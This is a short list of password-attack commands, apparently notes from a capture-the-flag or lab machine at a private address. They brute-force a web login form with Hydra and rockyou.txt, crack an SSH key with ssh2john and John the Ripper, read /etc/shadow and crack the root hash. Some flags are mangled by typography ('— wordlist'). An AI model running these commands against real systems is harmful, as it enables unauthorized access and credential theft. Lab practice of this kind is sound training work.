 hydra -l usuarioencontrado -P rockyou.txt 10.10.107.125 http-post-form “/DIRECTORIOSECRETO:user=^USER^&pass=^PASS^:Username or password invalid”
sudo /usr/share/john/ssh2john.py archivodescargado > hash.txt
sudo john — wordlist=rockyou.txt hash.txt
**sudo cat /etc/shadow**
**sudo john — wordlist=rockyou.txt roothash.txt**
